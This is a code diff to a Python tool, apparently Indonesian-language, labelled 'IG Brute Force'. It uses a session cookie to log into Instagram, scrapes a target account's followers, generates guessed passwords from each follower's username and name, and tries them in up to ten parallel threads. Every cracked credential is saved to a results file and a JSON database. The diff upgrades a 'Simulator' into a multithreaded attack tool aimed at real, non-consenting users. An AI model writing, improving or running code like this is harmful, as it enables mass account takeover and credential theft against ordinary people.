@@ -1,9 +1,9 @@
-import os
-import json
-import time
+import os, json, time, random
+from concurrent.futures import ThreadPoolExecutor
 from instagrapi import Client
 from colorama import Fore, init
-from utils.brute_force import brute_force_attack
+from utils.brute_force import threaded_login_attempt
+from utils.tools import generate_passwords
 
 init(autoreset=True)
 
@@ -11,7 +11,6 @@ DATA_FOLDER = "Data/akun1"
 COOKIE_FILE = os.path.join(DATA_FOLDER, "cookie.txt")
 USER_FILE = os.path.join(DATA_FOLDER, "user.txt")
 HASH_DB = "hash_db.json"
-RESULT_FILE = "hasil_sukses.txt"
 
 def load_cookie():
     if not os.path.exists(COOKIE_FILE) or not os.path.exists(USER_FILE):
@@ -31,19 +30,16 @@ def load_cookie():
             cookies[k] = v
     return username, cookies
 
-def save_result(username, password):
-    with open(RESULT_FILE, "a") as f:
-        f.write(f"{username} | {password}\n")
-
 def load_hash_db():
-    if not os.path.exists(HASH_DB):
-        return {}
-    with open(HASH_DB, "r") as f:
-        return json.load(f)
+    return json.load(open(HASH_DB)) if os.path.exists(HASH_DB) else {}
 
 def update_hash_db(db):
     with open(HASH_DB, "w") as f:
         json.dump(db, f, indent=2)
+
+def save_result(username, password):
+    with open("hasil_sukses.txt", "a") as f:
+        f.write(f"{username} | {password}\n")
 
 def scrape_followers(cl, target_user):
     try:
@@ -56,12 +52,12 @@ def scrape_followers(cl, target_user):
 
 def main():
     os.system("clear")
-    print(Fore.CYAN + "== Gold3xp IG Brute Force Simulator ==")
+    print(Fore.CYAN + "== Gold3xp IG Brute Force Multithreaded ==")
     target_user = input(Fore.YELLOW + "Masukkan username target (tanpa @): ").strip().lstrip("@")
 
     login_user, cookies = load_cookie()
-
     cl = Client()
+
     try:
         cl.login_by_sessionid(cookies.get("sessionid"))
         print(Fore.GREEN + f"[✓] Login berhasil sebagai @{login_user}")
@@ -74,14 +70,21 @@ def main():
     print(Fore.GREEN + f"[✓] Ditemukan {len(followers)} followers")
 
     hash_db = load_hash_db()
+    max_threads = 10
 
-    # Jalankan brute force terhadap followers
-    brute_force_attack(
-        user_list=followers,
-        hash_db=hash_db,
-        save_callback=save_result,
-        update_callback=update_hash_db
-    )
+    with ThreadPoolExecutor(max_workers=max_threads) as executor:
+        futures = []
+        for username, full_name in followers.items():
+            password_list = generate_passwords(username, full_name)
+            futures.append(executor.submit(threaded_login_attempt, username, password_list, hash_db))
+
+        for future in futures:
+            result = future.result()
+            if result:
+                username, password = result
+                save_result(username, password)
+                hash_db[username] = password
+                update_hash_db(hash_db)
 
 if __name__ == "__main__":
     main()
